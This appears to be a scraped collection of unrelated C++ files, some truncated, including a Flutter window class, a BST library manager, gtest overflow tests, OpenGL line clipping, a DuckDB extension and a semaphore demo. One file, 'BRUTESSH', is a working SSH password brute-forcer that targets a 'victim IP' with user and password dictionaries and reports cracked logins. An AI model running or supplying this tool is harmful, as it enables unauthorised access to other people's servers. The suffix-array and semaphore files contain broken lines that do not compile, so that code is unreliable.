    "#include \"flutter_window.h\"\n\n#include <optional>\n\n#include \"flutter/generated_plugin_registrant.h\"\n\nFlutterWindow::FlutterWindow(const flutter::DartProject& project)\n    : project_(project) {}\n\nFlutterWindow::~FlutterWindow() {}\n\nbool FlutterWindow::OnCreate() {\n  if (!Win32Window::OnCreate()) {\n    return false;\n  }\n\n  RECT frame = GetClientArea();\n\n  // The size here must match the window dimensions to avoid unnecessary surface\n  // creation / destruction in the startup path.\n  flutter_controller_ = std::make_unique<flutter::FlutterViewController>(\n      frame.right - frame.left, frame.bottom - frame.top, project_);\n  // Ensure that basic setup of the controller was successful.\n  if (!flutter_controller_->engine() || !flutter_controller_->view()) {\n    return false;\n  }\n  RegisterPlugins(flutter_controller_->engine());\n  SetChildContent(flutter_controller_->view()->GetNativeWindow());\n\n  flutter_controller_->engine()->SetNextFrameCallback([&]() {\n    this->Show();\n  });\n\n  return true;\n}\n\nvoid FlutterWindow::OnDestroy() {\n  if (flutter_controller_) {\n    flutter_controller_ = nullptr;\n  }\n\n  Win32Window::OnDestroy();\n}\n\nLRESULT\nFlutterWindow::MessageHandler(HWND hwnd, UINT const message,\n                              WPARAM const wparam,\n                              LPARAM const lparam) noexcept {\n  // Give Flutter, including plugins, an opportunity to handle window messages.\n  if (flutter_controller_) {\n    std::optional<LRESULT> result =\n        flutter_controller_->HandleTopLevelWindowProc(hwnd, message, wparam,\n                                                      lparam);\n    if (result) {\n      return *result;\n    }\n  }\n\n  switch (message) {\n    case WM_FONTCHANGE:\n      flutter_controller_->engine()->ReloadSystemFonts();\n      break;\n  }\n\n  return Win32Window::MessageHandler(hwnd, message, wparam, lparam);\n}\n",
    "// Construcci\u00f3n del suffix array y la BWT de un texto\n//\n// Prerrequisitos: Tener la biblioteca SDSL instalada\n//\n// Compilaci\u00f3n: g++ -O3 -o sa sa.cpp -lsdsl -ldivsufsort -ldivsufsort64\n#include <sdsl/suffix_arrays.hpp>\n#include <string>\n#include <iostream>\n#include <algorithm>\nusing namespace sdsl;\nusing namespace std;\nint main(int argc, char** argv) {\n  if (argc !=  2) {\n    cout << \"Uso: \" << argv[0] << \" <archivo entrada>\" << endl;\n    return 1;\n  }\n  // Leemos el archivo de entrada y guardamos el contenido en 'seq'\n  string infile(argv[1]);\n  \n  int_vector<> seq;\n  int32_t n;\n  {\n    load_vector_from_file(seq, infile, 1);\n    n = seq.size();\n    \n    seq.resize(n+1);\n    n = seq.size();\n    seq[n-1] = 0; // Representa el final de texto. Suele representarse por el\n                  // s\u00edmbolo $ \n  }\n  cout << \"Construyendo el Suffix array ...\" << endl;\n  \n  int_vector<> sa(1, 0, bits::hi(n)+1);\n  sa.resize(n);\n  algorithm::calculate_sa((const unsigned char*)seq.data(), n, sa);\n\n  Cst::int_vector<> sdsl::algorithm::locate();\n\n  for (int i = 0; i < sa.size(); i++)\n  {\n    cout<<sa[i]<<endl;\n  }\n  \n\n  cout << \"Tama\u00f1o del SA \" << size_in_mega_bytes(sa) << \" MB.\" << endl;\n  \n  return 0;\n}",
    "#include <iostream>\r\n#include <string>\r\n#include <stdlib.h>\r\n\r\nusing namespace std;\r\n\r\nstruct Book\r\n{\r\n    string title;\r\n    string author;\r\n    int ISBN;\r\n};\r\n\r\nstruct BinarySearchTree\r\n{\r\n    Book book;\r\n    BinarySearchTree *left;\r\n    BinarySearchTree *right;\r\n};\r\n\r\nBinarySearchTree *root;\r\n\r\n//Function to create a new node\r\nBinarySearchTree *CreateNewNode(Book book)\r\n{\r\n    BinarySearchTree *temp = new BinarySearchTree;\r\n    temp->book = book;\r\n    temp->left = NULL;\r\n    temp->right = NULL;\r\n    return temp;\r\n}\r\n\r\n//Function to insert a book into the tree\r\nBinarySearchTree *InsertBook(Book book, BinarySearchTree *node)\r\n{\r\n    if (node == NULL)\r\n    {\r\n        node = CreateNewNode(book);\r\n    }\r\n    else if (book.ISBN < node->book.ISBN)\r\n    {\r\n        node->left = InsertBook(book, node->left);\r\n    }\r\n    else if (book.ISBN > node->book.ISBN)\r\n    {\r\n        node->right = InsertBook(book, node->right);\r\n    }\r\n    return node;\r\n}\r\n\r\n//Function to delete a book from the tree\r\nBinarySearchTree *DeleteBook(int ISBN, BinarySearchTree *node)\r\n{\r\n    if (node == NULL)\r\n    {\r\n        return node;\r\n    }\r\n    else if (ISBN < node->book.ISBN)\r\n    {\r\n        node->left = DeleteBook(ISBN, node->left);\r\n    }\r\n    else if (ISBN > node->book.ISBN)\r\n    {\r\n        node->right = DeleteBook(ISBN, node->right);\r\n    }\r\n    else\r\n    {\r\n        //No Children\r\n        if (node->left == NULL && node->right == NULL)\r\n        {\r\n            delete node;\r\n            node = NULL;\r\n        }\r\n        //One Child\r\n        else if (node->left == NULL)\r\n        {\r\n            BinarySearchTree *temp = node;\r\n            node = node->right;\r\n            delete temp;\r\n        }\r\n        else if (node->right == NULL)\r\n        {\r\n            BinarySearchTree *temp = node;\r\n            node = node->left;\r\n            delete temp;\r\n        }\r\n        //Two Children\r\n        else\r\n        {\r\n            BinarySearchTree *temp = node->right;\r\n            while (temp->left != NULL)\r\n            {\r\n                temp = temp->left;\r\n            }\r\n            node->book = temp->book;\r\n            node->right = DeleteBook(temp->book.ISBN, node->right);\r\n        }\r\n    }\r\n    return node;\r\n}\r\n\r\n//Function to search for a book in the tree\r\nbool SearchBook(int ISBN, BinarySearchTree *node)\r\n{\r\n    if (node == NULL)\r\n    {\r\n        return false;\r\n    }\r\n    else if (ISBN < node->book.ISBN)\r\n    {\r\n        return SearchBook(ISBN, node->left);\r\n    }\r\n    else if (ISBN > node->book.ISBN)\r\n    {\r\n        return SearchBook(ISBN, node->right);\r\n    }\r\n    else\r\n    {\r\n        return true;\r\n    }\r\n}\r\n\r\n//Function to list all books in the tree\r\nvoid ListAllBooks(BinarySearchTree *node)\r\n{\r\n    if (node == NULL)\r\n    {\r\n        return;\r\n    }\r\n    ListAllBooks(node->left);\r\n    cout << \"Title: \" << node->book.title << endl;\r\n    cout << \"Author: \" << node->book.author << endl;\r\n    cout << \"ISBN: \" << node->book.ISBN << endl;\r\n    ListAllBooks(node->right);\r\n}\r\n\r\n//Function to list all books by an author\r\nvoid ListAllByAuthor(string author, BinarySearchTree *node)\r\n{\r\n    if (node == NULL)\r\n    {\r\n        return;\r\n    }\r\n    ListAllByAuthor(author, node->left);\r\n    if (node->book.author == author)\r\n    {\r\n        cout << \"Title: \" << node->book.title << endl;\r\n        cout << \"Author: \" << node->book.author << endl;\r\n        cout << \"ISBN: \" << node->book.ISBN << endl;\r\n    }\r\n    ListAllByAuthor(author, node->right);\r\n}\r\n\r\nint main()\r\n{\r\n    int userChoice;\r\n\r\n    //Menu to select user action\r\n    do\r\n    {\r\n        cout<<\"\\t\\t<<=========================>>\\n\\t\\t>>LIBRARY MANAGEMENT SYSTEM<< \\n\\t\\t<<=========================>>\"<<endl;\r\n        cout << \"1. Add a book\" << endl;\r\n        cout << \"2. Delete a book\" << endl;\r\n        cout << \"3. Search for a book\" << endl;\r\n        cout << \"4. List all books\" << endl;\r\n        cout << \"5. List all books by an author\" << endl;\r\n        cout << \"6. Exit\" << endl;\r\n        cout << \"Please enter your choice: \";\r\n        cin >> userChoice;\r\n\r\n        switch (userChoice)\r\n        {\r\n        case 1:\r\n        {\r\n            Book book;\r\n            cout << \"Enter book title: \";\r\n            cin.ignore();\r\n            getline(cin, book.title);\r\n            cout << \"Enter book author: \";\r\n            getline(cin, book.author);\r\n            cout << \"Enter ISBN: \";\r\n            cin >> book.ISBN;\r\n\r\n            root = InsertBook(book, root);\r\n            cout << \"Book added successfully!\" << endl;\r\n            break;\r\n        }\r\n        case 2:\r\n        {\r\n            cout << \"1. Delete by title\" << endl;\r\n            cout << \"2. Delete by ISBN\" << endl;\r\n            int deleteChoice;\r\n            cout << \"Please enter your choice: \";\r\n            cin >> deleteChoice;\r\n\r\n            if (deleteChoice == 1)\r\n            {\r\n                string title;\r\n                cout << \"Enter book title: \";\r\n                cin.ignore();\r\n                getline(cin, title);\r\n            }\r\n            else if (deleteChoice ",
    "#include <cmath>\n#include <cstdint>\n#include <limits>\n#include <tuple>\n\n#include \"BrainMath/IntMath.hpp\"\n#include \"gtest/gtest.h\"\n#include \"TestingUtils.hpp\"\n\ntemplate <BrainMath::Concepts::Integer T>\nvoid mean_test() {\n\tconstexpr T max = std::numeric_limits<T>::max();\n\tconstexpr T min = std::numeric_limits<T>::min();\n\n\tfor (const auto& [a, b, expected] : {std::tuple<T, T, T>{0, 0, 0},\n\t                                     {1, 0, 0},\n\t                                     {1, 1, 1},\n\t                                     {0, max, max / 2},\n\t                                     {1, max, max / 2 + 1},\n\t                                     {max, max, max},\n\t                                     {0, min, min / 2},\n\t                                     {1, min, min / 2},\n\t                                     {min, min, min}}) {\n\t\tEXPECT_EQ(BrainMath::IntMath::mean(a, b), expected);\n\t\tEXPECT_EQ(BrainMath::IntMath::mean(b, a), expected);\n\t}\n}\n\ntemplate <BrainMath::Concepts::Integer T>\nvoid add_overflow_test(\n    std::function<std::pair<T, bool>(T, T)> add_overflow = BrainMath::IntMath::add_overflow<T, false>) {\n\tconstexpr bool isSigned = std::is_signed_v<T>;\n\tconstexpr T max = std::numeric_limits<T>::max();\n\tconstexpr T min = std::numeric_limits<T>::min();\n\n\tfor (const auto& [a, b, expected] : {std::tuple<T, T, bool>{0, 0, false},\n\t                                     {0, max, false},\n\t                                     {1, max, true},\n\t                                     {max, max, true},\n\t                                     {max / 2, max / 2, false},\n\t                                     {max / 2, max / 2 + 1, false},\n\t                                     {max / 2 + 1, max / 2 + 1, true},\n\t                                     {min, min, isSigned},\n\t                                     {min, max, false},\n\t                                     {min / 2, min / 2, false},\n\t                                     {min / 2 - 1, min / 2, isSigned}}) {\n\t\tEXPECT_EQ(add_overflow(a, b).second, expected) << type_name<T>() << \": Case \" << a << \" + \" << b;\n\t\tEXPECT_EQ(add_overflow(b, a).second, expected) << type_name<T>() << \": Case \" << b << \" + \" << a;\n\t}\n}\n\ntemplate <BrainMath::Concepts::Integer T>\nvoid sub_overflow_test(\n    std::function<std::pair<T, bool>(T, T)> sub_overflow = BrainMath::IntMath::sub_overflow<T, false>) {\n\tconstexpr bool isSigned = std::is_signed_v<T>;\n\tconstexpr T max = std::numeric_limits<T>::max();\n\tconstexpr T min = std::numeric_limits<T>::min();\n\n\tfor (const auto& [a, b, expected] : {std::tuple<T, T, bool>{0, 0, false},\n\t                                     {0, 1, !isSigned},\n\t                                     {0, max, !isSigned},\n\t                                     {max, max, false},\n\t                                     {max / 2, max / 2, false},\n\t                                     {max / 2, max / 2 + 1, !isSigned},\n\t                                     {max / 2 + 1, max / 2, false},\n\t                                     {min, 0, false},\n\t                                     {min, 1, true},\n\t                                     {min / 2, min / 2, false},\n\t                                     {min / 2, min / 2 + 1, !isSigned},\n\t                                     {min / 2, max / 2, !isSigned},\n\t                                     {min / 2, max / 2 + 1, !isSigned},\n\t                                     {min / 2, max / 2 + 2, true}}) {\n\t\tEXPECT_EQ(sub_overflow(a, b).second, expected) << type_name<T>() << \": Case \" << a << \" - \" << b;\n\t}\n}\n\ntemplate <BrainMath::Concepts::Integer T>\nvoid mul_overflow_test(\n    std::function<std::pair<T, bool>(T, T)> mul_overflow = BrainMath::IntMath::mul_overflow<T, false>) {\n\tconstexpr bool isSigned = std::is_signed_v<T>;\n\tconstexpr T max = std::numeric_limits<T>::max();\n\tconstexpr T min = std::numeric_limits<T>::min();\n\n\tfor (const auto& [a, b, expected] : {std::tuple<T, T, bool>{0, 0, false},\n\t                                     {1, 1, false},\n\t                                     {0, max, false},\n\t                                     {1, max, false},\n\t                                     {2, max, true},\n\t                                     {2, max / 2, false},\n\t                                     {3, max / 2, true},\n\t                                     {2, max / 2 + 1, true}}) {\n\t\tEXPECT_EQ(mul_overflow(a, b).second, expected) << type_name<T>() << \": Case \" << a << \" * \" << b;\n\t\tEXPECT_EQ(mul_overflow(b, a).second, expected) << type_name<T>() << \": Case \" << b << \" * \" << a;\n\t}\n\n\tif constexpr (isSigned) {\n\t\tfor (const auto& [a, b, expected] :\n\t\t     {std::tuple<T, T, bool>{-1, -1, false}, {1, min, false}, {2, min, true}, {-1, min, true}}) {\n\t\t\tEXPECT_EQ(mul_overflow(a, b).second, expected) << type_name<T>() << \": Case \" << a << \" * \" << b;\n\t\t\tEXPECT_EQ(mul_overflow(b, a).second, expected) << type_name<T>() << \": Case \" << b << \" * \" << a;\n\t\t}\n\t}\n}\n\n#ifdef BRAINMATH_HAS_BUILTIN_OVERFLOW\ntemplate <BrainMath::Concepts::Integer T>\nvoid random_overflow_parity",
    "#include <GL/glut.h>\n\n#define SCREEN_WIDTH 640\n#define SCREEN_HEIGHT 480\n\ntypedef struct {\n    GLfloat x, y;\n} Point;\n\nconst GLint WIN_LEFT_BIT = 0x01;\nconst GLint WIN_RIGHT_BIT = 0x02;\nconst GLint WIN_BOTTOM_BIT = 0x04;\nconst GLint WIN_TOP_BIT = 0x08;\n\nvoid init_graph(int argc, char **argv) {\n    glutInit(&argc, argv);\n    glutInitDisplayMode(GLUT_SINGLE | GLUT_RGB);\n    glutInitWindowSize(SCREEN_WIDTH, SCREEN_HEIGHT);\n    glutCreateWindow(argv[0]);\n    glClearColor(1.0, 1.0, 1.0, 0.0);\n    glPointSize(1.0f);\n    glMatrixMode(GL_PROJECTION);\n    glLoadIdentity();\n    gluOrtho2D(0, SCREEN_WIDTH, 0, SCREEN_HEIGHT);\n}\n\nvoid close_graph() {\n    glutMainLoop();\n}\n\nvoid swap_points(Point *p1, Point *p2) {\n    Point t = *p1;\n    *p1 = *p2;\n    *p2 = t;\n}\n\nvoid swap_codes(GLint *x, GLint *y) {\n    GLint t = *x;\n    *x = *y;\n    *y = t;\n}\n\nGLint inside(GLint code) {\n    return !code;\n}\n\nGLint accept(GLint code1, GLint code2) {\n    return !(code1 | code2);\n}\n\nGLint reject(GLint code1, GLint code2) {\n    return code1 & code2;\n}\n\nGLint encode(Point p1, Point win_min, Point win_max) {\n    GLint code = 0x00;\n\n    if (p1.x < win_min.x) code |= WIN_LEFT_BIT;\n    if (p1.x > win_max.x) code |= WIN_RIGHT_BIT;\n    if (p1.y < win_min.y) code |= WIN_BOTTOM_BIT;\n    if (p1.y > win_max.y) code |= WIN_TOP_BIT;\n    return code;\n}\n\nGLint round(GLfloat a) {\n    return (GLint) (a + 0.5f);\n}\n\nvoid line_clip(Point p1, Point p2, Point win_min, Point win_max) {\n    GLint code1, code2;\n    GLint done = 0, plot_line = 0;\n    GLfloat m = 0;\n    if (p1.x != p2.x) {\n        m = (p2.y - p1.y) / (p2.x - p1.x);\n    }\n    while (!done) {\n        code1 = encode(p1, win_min, win_max);\n        code2 = encode(p2, win_min, win_max);\n        if (accept(code1, code2)) {\n            done = 1;\n            plot_line = 1;\n        } else if (reject(code1, code2)) {\n            done = 1;\n        } else {\n            if (inside(code1)) {\n                swap_points(&p1, &p2);\n                swap_codes(&code1, &code2);\n            }\n            if (code1 & WIN_LEFT_BIT) {\n                p1.y += (win_min.x - p1.x) * m;\n                p1.x = win_min.x;\n            } else if (code1 & WIN_RIGHT_BIT) {\n                p1.y += (win_max.x - p1.x) * m;\n                p1.x = win_max.x;\n            } else if (code1 & WIN_BOTTOM_BIT) {\n                if (p1.x != p2.x)\n                    p1.x += (win_min.y - p1.y) / m;\n                p1.y = win_min.y;\n            } else if (code1 & WIN_TOP_BIT) {\n                if (p1.x != p2.x)\n                    p1.x += (win_max.y - p1.y) / m;\n                p1.y = win_max.y;\n            }\n        }\n    }\n\n    if (plot_line) {\n        glColor3f(1, 0, 0);\n        glLineWidth(2);\n        glBegin(GL_LINES);\n        glVertex2i(round(p1.x), round(p1.y));\n        glVertex2i(round(p2.x), round(p2.y));\n        glEnd();\n        glFlush();\n    }\n}\n\nvoid draw_window(Point win_min, Point win_max) {\n\n    glColor3f(0, 0, 0);\n    glBegin(GL_LINE_LOOP);\n    glVertex2i(round(win_min.x), round(win_min.y));\n    glVertex2i(round(win_min.x), round(win_max.y));\n    glVertex2i(round(win_max.x), round(win_max.y));\n    glVertex2i(round(win_max.x), round(win_min.y));\n    glEnd();\n    glFlush();\n}\n\nvoid init_clip() {\n    glClear(GL_COLOR_BUFFER_BIT);\n\n    Point win_min = {60, 60};\n    Point win_max = {470, 290};\n    draw_window(win_min, win_max);\n    Point p1 = {50, 50};\n    Point p2 = {490, 310};\n    glColor3f(0, 0, 1);\n    glBegin(GL_LINES);\n    glVertex2i(round(p1.x), round(p1.y));\n    glVertex2i(round(p2.x), round(p2.y));\n    glEnd();\n    line_clip(p1, p2, win_min, win_max);\n}\n\nint main(int argc, char **argv) {\n    init_graph(argc, argv);\n    glutDisplayFunc(init_clip);\n    close_graph();\n    return EXIT_SUCCESS;\n}\n",
    "#include <libssh/libssh.h>\n#include <iostream>\n#include <fstream>\n#include <string>\n#include <sstream>\n#include <algorithm>\n#include <thread>\n#include <chrono>\n#include <future>\n\nusing namespace std;\n\nint minmili;\nint lastchoice = 2;\n\n//para conectarse via ssh\nvoid connectSSH(string host, int port, string user, string password){\n\n    int rc;\n    ssh_session my_ssh_session;\n\n\n    my_ssh_session = ssh_new();\n\n\n    ssh_options_set(my_ssh_session, SSH_OPTIONS_HOST, host.c_str());\n    ssh_options_set(my_ssh_session, SSH_OPTIONS_USER, user.c_str());\n    ssh_options_set(my_ssh_session, SSH_OPTIONS_PORT, &port);\n\n    rc = ssh_connect(my_ssh_session);\n\n\n    if (rc != SSH_OK) {\n        printf(\"Error connecting to SSH server\\n\");\n        ssh_free(my_ssh_session);\n        lastchoice = -1;\n    }\n\n\n\n\n\n    rc = ssh_userauth_password(my_ssh_session, NULL, password.c_str());\n    //si no se conecta\n    if (rc != SSH_AUTH_SUCCESS) {\n        cout << \"User: \" << user << \" Password: \" << password << \" ---> NOT FOUND (X)\\n\" << endl;\n        ssh_disconnect(my_ssh_session);\n        ssh_free(my_ssh_session);\n        lastchoice = 1;\n\n    //si se conecta\n    } else {\n        cout << \"\\033[1;32mUser: \" << user << \" Password: \" << password << \" ---> LOGIN FOUND (V)\\033[0m\" << endl;\n        ssh_disconnect(my_ssh_session);\n        ssh_free(my_ssh_session);\n        lastchoice = 0;\n    }\n\n\n}\n\n//to check if a string is an int\nbool isInteger(const string& str) {\n    istringstream iss(str);\n    int value;\n    iss >> value;\n    return !iss.fail() && iss.eof();\n}\n\n\n//for timeout\nint future_connectSSH(string host, int port, string user, string password, int miliseconds){\n\n\n    std::thread t([&]() {\n       connectSSH(host, port, user, password);\n    });\n\n\n    std::this_thread::sleep_for(std::chrono::milliseconds(miliseconds));\n\n\n    if (t.joinable()) {\n        cout << \"User: \" << user << \" Password: \" << password << \" ---> TIMEOUT (X)\\n\" << endl;\n        t.detach();\n    } else {\n\n        t.join();\n        \n    }\n\n    return lastchoice;\n    \n}\n\nint main(){\n    \n\n    string mili_s;\n    int miliseconds;\n    string host;\n    string user;\n    string password;\n    string port_s;\n    int port;\n\n\n    //input\n    printf(\"BRUTESSH\\n\");\n    printf(\"Select the victim IP: \");\n    cin >> host;\n    \n    printf(\"Select the victim port: \");\n    cin >> port_s;\n    //check if port is a number\n    if (!isInteger(port_s)){\n        printf(\"ERROR: the port must be a number\\n\");\n        return 1;\n    }\n    istringstream iss(port_s);\n    iss >> port;\n\n    printf(\"Set the milliseconds for timeout: \");\n    cin >> mili_s;\n    if (!isInteger(mili_s)){\n        printf(\"ERROR: the milliseconds must be a number\\n\");\n        return 1;\n    }\n\n    istringstream oss(mili_s);\n    oss >> miliseconds;\n\n    minmili = miliseconds;\n    printf(\"Select a user or a user dictionary: \");\n    cin >> user;\n    printf(\"Select a password or a password dictionary: \");\n    cin >> password;\n\n    //remove single quotes from the strings\n    user.erase(remove_if(user.begin(), user.end(), [](char c) { return c == '\\''; }), user.end());\n    password.erase(remove_if(password.begin(), password.end(), [](char c) { return c == '\\''; }), password.end());\n\n    //abrir archivos\n    ifstream file_u(user);\n    ifstream file_p(password);\n    \n    bool u_d = true;\n    bool p_d = true;\n\n    \n    //si no se abre lo detecta como nombre\n    if (!file_u.is_open()) {\n        printf(\"Error opening the dictionary, setting as user\\n\");\n        u_d = false;\n        \n    }\n\n    if (!file_p.is_open()) {\n        printf(\"Error opening the dictionary, setting as password\\n\");\n        p_d = false;\n    }\n\n    //testear tiempo, si el timeout dura demasiado se rebaja al limite normal\n    auto startTime = std::chrono::high_resolution_clock::now();\n    connectSSH(host, port, \"test\", \"test\");\n    auto endTime = std::chrono::high_resolution_clock::now();\n    int resta = std::chrono::duration_cast<std::chrono::milliseconds>(endTime - startTime).count();\n    if (resta < minmili){\n        minmili = resta;\n    }\n\n    //si el usuario no es diccionario\n    if (!u_d){\n        \n        //si la contrasenya no es diccionario\n        if (!p_d){\n\n            connectSSH(host, port, user, password);\n            if (lastchoice == 0 || lastchoice == -1){\n                return lastchoice;\n            }\n        //si la contrasenya si es diccionario\n        } else {\n            string line;\n            while (getline(file_p, line)) {\n\n\n                \n                int result = future_connectSSH(host, port, user, line, minmili);\n                if (result == 0 || result == -1){\n                    return result;\n                }\n\n            }\n\n        }\n\n    //si el usuario es diccionario\n    } else {\n\n        //si la contrasenya no es diccionario\n        if (!p_d){\n\n            string line;\n            while (getline(file_u, line)) {\n\n\n                int result = future_connectSSH(host, port, line, password, minmili);\n                if (result == 0 ",
    "#define DUCKDB_EXTENSION_MAIN\n\n#include \"dynamic_sql_examples_extension.hpp\"\n#include \"duckdb.hpp\"\n#include \"duckdb/common/exception.hpp\"\n#include \"duckdb/common/string_util.hpp\"\n#include \"duckdb/function/scalar_function.hpp\"\n#include \"duckdb/main/extension_util.hpp\"\n#include <duckdb/parser/parsed_data/create_scalar_function_info.hpp>\n\n// OpenSSL linked through vcpkg\n#include <openssl/opensslv.h>\n\n#include \"duckdb/catalog/default/default_functions.hpp\"\n#include \"duckdb/catalog/default/default_table_functions.hpp\"\n\nnamespace duckdb {\n\n// To add a new scalar SQL macro, add a new macro to this array!\n// Copy and paste the top item in the array into the \n// second-to-last position and make some modifications. \n// (essentially, leave the last entry in the array as {nullptr, nullptr, {nullptr}, nullptr})\n\n// Keep the DEFAULT_SCHEMA (no change needed)\n// Replace \"times_two\" with a name for your macro\n// If your function has parameters, add their names in quotes inside of the {}, with a nullptr at the end\n//      If you do not have parameters, simplify to {nullptr}\n// Add the text of your SQL macro as a raw string with the format R\"( select 42 )\"\nstatic DefaultMacro dynamic_sql_examples_macros[] = {\n    {DEFAULT_SCHEMA, \"times_two\", {\"x\", nullptr}, R\"(x*2)\"},\n    {nullptr, nullptr, {nullptr}, nullptr}};\n\n\n// To add a new table SQL macro, add a new macro to this array!\n// Copy and paste the top item in the array into the \n// second-to-last position and make some modifications. \n// (essentially, leave the last entry in the array as {nullptr, nullptr, {nullptr}, nullptr})\n\n// Keep the DEFAULT_SCHEMA (no change needed)\n// Replace \"times_two_table\" with a name for your macro\n// If your function has parameters without default values, add their names in quotes inside of the {}, with a nullptr at the end\n//      If you do not have parameters, simplify to {nullptr}\n// If your function has parameters with default values, add their names and values in quotes inside of {}'s inside of the {}.\n// Be sure to keep {nullptr, nullptr} at the end\n//      If you do not have parameters with default values, simplify to {nullptr, nullptr}\n// Add the text of your SQL macro as a raw string with the format R\"( select 42; )\" \n\n// clang-format off\nstatic const DefaultTableMacro dynamic_sql_examples_table_macros[] = {\n\t{DEFAULT_SCHEMA, \"times_two_table\", {\"x\", nullptr}, {{\"two\", \"2\"}, {nullptr, nullptr}},  R\"(SELECT x * two as output_column;)\"},\n\t{nullptr, nullptr, {nullptr}, {{nullptr, nullptr}}, nullptr}\n\t};\n// clang-format on\n\ninline void DynamicSqlExamplesScalarFun(DataChunk &args, ExpressionState &state, Vector &result) {\n    auto &name_vector = args.data[0];\n    UnaryExecutor::Execute<string_t, string_t>(\n\t    name_vector, result, args.size(),\n\t    [&](string_t name) {\n\t\t\treturn StringVector::AddString(result, \"DynamicSqlExamples \"+name.GetString()+\" \ud83d\udc25\");;\n        });\n}\n\ninline void DynamicSqlExamplesOpenSSLVersionScalarFun(DataChunk &args, ExpressionState &state, Vector &result) {\n    auto &name_vector = args.data[0];\n    UnaryExecutor::Execute<string_t, string_t>(\n\t    name_vector, result, args.size(),\n\t    [&](string_t name) {\n\t\t\treturn StringVector::AddString(result, \"DynamicSqlExamples \" + name.GetString() +\n                                                     \", my linked OpenSSL version is \" +\n                                                     OPENSSL_VERSION_TEXT );;\n        });\n}\n\nstatic void LoadInternal(DatabaseInstance &instance) {\n    // Register a scalar function\n    auto dynamic_sql_examples_scalar_function = ScalarFunction(\"dynamic_sql_examples\", {LogicalType::VARCHAR}, LogicalType::VARCHAR, DynamicSqlExamplesScalarFun);\n    ExtensionUtil::RegisterFunction(instance, dynamic_sql_examples_scalar_function);\n\n    // Register another scalar function\n    auto dynamic_sql_examples_openssl_version_scalar_function = ScalarFunction(\"dynamic_sql_examples_openssl_version\", {LogicalType::VARCHAR},\n                                                LogicalType::VARCHAR, DynamicSqlExamplesOpenSSLVersionScalarFun);\n    ExtensionUtil::RegisterFunction(instance, dynamic_sql_examples_openssl_version_scalar_function);\n\n    // Macros\n\tfor (idx_t index = 0; dynamic_sql_examples_macros[index].name != nullptr; index++) {\n\t\tauto info = DefaultFunctionGenerator::CreateInternalMacroInfo(dynamic_sql_examples_macros[index]);\n\t\tExtensionUtil::RegisterFunction(instance, *info);\n\t}\n    // Table Macros\n    for (idx_t index = 0; dynamic_sql_examples_table_macros[index].name != nullptr; index++) {\n\t\tauto table_info = DefaultTableFunctionGenerator::CreateTableMacroInfo(dynamic_sql_examples_table_macros[index]);\n        ExtensionUtil::RegisterFunction(instance, *table_info);\n\t}\n}\n\nvoid DynamicSqlExamplesExtension::Load(DuckDB &db) {\n\tLoadInternal(*db.instance);\n}\nstd::string DynamicSqlExamplesExtension::Name() {\n\treturn \"dynamic_sql_examples\";\n}\n\nstd::string DynamicSqlExamplesExtension::Version() const {\n#ifdef EXT_VERSION_DYNAMIC_SQL_EXAMPLES\n\treturn EXT_VER",
    "#include <iostream>\n#include <thread>\n#include <vector>\n#include <mutex>\n#include <condition_variable>\n\nusing namespace std;\n\nclass Semaphore {\npublic:\n    Semaphore(int count = 0) : count(count) {}\n\n    void signal() {\n        unique_lock<mutex> lock(mtx);\n        count++;\n        cv.notify_one();\n    }\n\n    void wait() {\n        unique_lock<mutex> lock(mtx);\n        cv.wait(lock, [this]() { return count > 0; });\n        count--;\n    }\n\nprivate:\n    mutex mtx;\n    condition_variable cv;\n    int count;\n};\n\n\nSemaphore semaphore(1); // Initialize the semaphore with 1 permit\nint sharedResource = 0;\n\nvoid accessResource(int threadID) {\n    semaphore.wait(); // Acquire the semaphore\n\n    // Critical section (accessing shared resource)\n    cout << \"Thread \" << threadID << \" is accessing the shared resource.\" << endl;\n    sharedResource++;\n    cout << \"Shared resource value: \" << sharedResource << endl;\n\n    this_thread::sleep_for(chrono::seconds(1)); // Simulate some work\n\n    cout << \"Thread \" << threadID << \" is releasing the shared resource.\" endl;\n    semaphore.signal(); // Release the semaphore\n}\n\nint main() {\n    const int numThreads = 5;\n    vector<thread> threads;\n\n    // Create multiple threads to access the shared resource\n    for (int i = 0; i < numThreads; ++i) {\n        threads.push_back(thread(accessResource, i + 1));\n    }\n\n    // Wait for all threads to finish\n    for (auto& thread : threads) {\n        thread.join();\n    }\n\n    return 0;\n}\n",
    "#include <iostream>\r\n#include <list>\r\n#include <cctype>\r\n#include <algorithm>\r\n#include <vector>\r\n \r\nusing namespace std;\r\n\r\nstring customerUsername=\"MISKA\";\r\nint customerPassword=1234;\r\nvector <string> bookNameList; //create a vector to store book name\r\nvector <string> bookIDList; //create a vector to store book ID\r\nvector <double> bookPriceList; //create a vector to store book prices\r\nvector <int> bookOrderIDList; //create a vector to ID of ordered books\r\nvector <string> orderedBookNameList;//create a vector to ordered book name\r\nvector <int> orderedBookCountList; //create a vector to ordered book count\r\nvector <int> orderTotalList;  //create a vector to store total price of each orders\r\nvector <string> bookQuotaList; // vector to store book quotations\r\n\r\n\r\nbool exitProgramme =false;\r\ndouble discount=0;\r\nint discountBookAmount=3;\r\n\r\n\r\n\r\n\r\n// ****************************************************Manager actions***********************************************\r\n\r\n// print the menu options for the bookshop manager \r\nvoid printManagerMenu(){\r\n    cout << endl;\r\n    cout << \"\\t| Manager menu |\"<< endl<< endl;\r\n    cout <<\"Press [1] to View books\" <<endl;\r\n    cout <<\"Press [2] to Add books\" <<endl;\r\n    cout <<\"Press [3] to Search books\" <<endl;\r\n    cout <<\"Press [4] to View book orders\" <<endl;\r\n    cout <<\"Press [5] to Add discounts\" <<endl ;\r\n    cout <<\"Press [6] to Exit from the menu\" <<endl << endl;\r\n    cout << \"Enter your choice here: \";  \r\n\r\n    \r\n}\r\n\r\n\r\n\r\nvoid addBook(){\r\n\r\n    bool addAnotherBook=false;\r\n    do{\r\n        //declare three variables to store the book name ,bookID, book price temporary\r\n        string bookName;\r\n        string bookID;\r\n        double bookPrice;\r\n\r\n        cout << endl << \"Enter the name of the book: \";\r\n        getline(cin >>  ws  ,bookName); // get the more than one word (line of characters) and assign it to the book name variable\r\n        bookNameList.push_back(bookName); // add the book name enterd by the user to the book name vector\r\n\r\n        cout << \"Enter the book ID: \";\r\n        cin >> bookID;\r\n        bookIDList.push_back(bookID); // add the book ID taken by the user to the book ID vector\r\n\r\n        cout << \"Enter the price of the book: \";\r\n        cin >> bookPrice;\r\n        bookPriceList.push_back(bookPrice); // add the price of the book to the book price vector\r\n\r\n        cout << endl << \"book \"<< bookName <<\" successfully added to the system\" << endl;\r\n\r\n        char goAgain;\r\n        cout << endl << \"press [Y] for Yes and [N] for No\" << endl;// asking whether the 